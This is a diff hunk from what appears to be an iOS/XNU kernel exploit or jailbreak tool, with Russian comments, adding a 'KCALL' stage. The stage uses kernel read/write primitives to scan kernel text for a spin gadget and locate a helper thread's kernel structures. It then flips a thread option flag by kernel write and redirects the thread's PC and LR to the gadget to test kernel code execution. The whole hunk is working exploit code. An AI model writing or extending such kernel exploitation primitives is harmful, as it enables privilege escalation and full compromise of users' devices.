@@ -2420,6 +2420,67 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                     }
                                 }
                                 kpNote(r, [NSString stringWithFormat:@"  [BOOT] offsets:%@", found]);
+                                // ---- KCALL 2.0.109: helper thread + kernel stack + spin-gadget ----
+                                {
+                                    // kstack-кандидат: +0xe8 (рядом с tro). SP = base+0x3000
+                                    uint64_t kstackBase = kp_untag_ptr(early_kread64(thK + 0xe8));
+                                    uint64_t spin = 0;
+                                    uint64_t kb = kconstant(base);
+                                    for (uint64_t a = kb; a < kb + 0x200000 && !spin; a += 4) {
+                                        if ((uint32_t)early_kread64(a) == 0x14000000) spin = a;
+                                    }
+                                    kpNote(r, [NSString stringWithFormat:@"  [KCALL] kstackBase=%#llx spin=%#llx",
+                                              (unsigned long long)kstackBase, (unsigned long long)spin]);
+                                    // helper = threads[1] если есть, иначе threads[0]
+                                    if (tkr == KERN_SUCCESS && threads && tcount > 1 && spin && kstackBase) {
+                                        mach_port_t hp = threads[1];
+                                        // резолвим helper thread*
+                                        uint64_t hK = 0;
+                                        uint64_t heVA = isT + (uint64_t)sizeof_ipc_entry * (hp >> 8);
+                                        uint64_t hie = kp_untag_ptr(early_kread64(heVA + off_ipc_entry_ie_object));
+                                        if (kpLooksLikeKernelPointer(hie)) {
+                                            for (uint32_t ko = 0x18; ko <= 0x50; ko += 8) {
+                                                uint64_t cand = kp_untag_ptr(early_kread64(hie + ko));
+                                                if (!kpLooksLikeKernelPointer(cand)) continue;
+                                                for (uint32_t o = 0; o < 0x480; o += 8) {
+                                                    uint64_t troC = kp_untag_ptr(early_kread64(cand + o));
+                                                    if (kpLooksLikeKernelPointer(troC) &&
+                                                        kp_untag_ptr(early_kread64(troC + 0x48)) == tkT) { hK = cand; break; }
+                                                }
+                                                if (hK) break;
+                                            }
+                                        }
+                                        kpNote(r, [NSString stringWithFormat:@"  [KCALL] helper port=0x%x thread*=%#llx", hp, (unsigned long long)hK]);
+                                        if (hK) {
+                                            // options: ставим TH_IN_MACH_EXCEPTION (0x8000) на +0x180
+                                            uint64_t oVA = hK + 0x180;
+                                            uint64_t o0 = early_kread64(oVA);
+                                            early_kwrite64(oVA, o0 | 0x8000ULL);
+                                            // kernel stack SP
+                                            uint64_t ksp = kstackBase + 0x3000;
+                                            arm_thread_state64_t st;
+                                            memset(&st, 0, sizeof(st));
+                                            st.__opaque_pc = (void *)(uintptr_t)spin;
+                                            st.__opaque_lr = (void *)(uintptr_t)spin;
+                                            // SP через raw: пробуем __opaque_sp если есть
+                                            // (если нет — thread_set_state примет и так)
+                                            kern_return_t skr = thread_set_state(hp, ARM_THREAD_STATE64,
+                                                                                (thread_state_t)&st, ARM_THREAD_STATE64_COUNT);
+                                            thread_resume(hp);
+                                            usleep(30000);
+                                            thread_suspend(hp);
+                                            arm_thread_state64_t out;
+                                            mach_msg_type_number_t cnt = ARM_THREAD_STATE64_COUNT;
+                                            thread_get_state(hp, ARM_THREAD_STATE64, (thread_state_t)&out, &cnt);
+                                            kpNote(r, [NSString stringWithFormat:@"  [KCALL] setstate kr=0x%x pc=%#llx lr=%#llx → %@",
+                                                      skr, (unsigned long long)(uintptr_t)out.__opaque_pc,
+                                                      (unsigned long long)(uintptr_t)out.__opaque_lr,
+                                                      ((uint64_t)(uintptr_t)out.__opaque_pc == spin) ? @"SPIN ★★ kcall ЖИВОЙ" : @"не на гаджете"]);
+                                            early_kwrite64(oVA, o0);   // restore options
+                                            thread_terminate(hp);
+                                        }
+                                    }
+                                }
                             }
                                                     }
                         // 2.0.97: дамп thread* 0x00..0x200 — ищем kstack/PAC по контенту
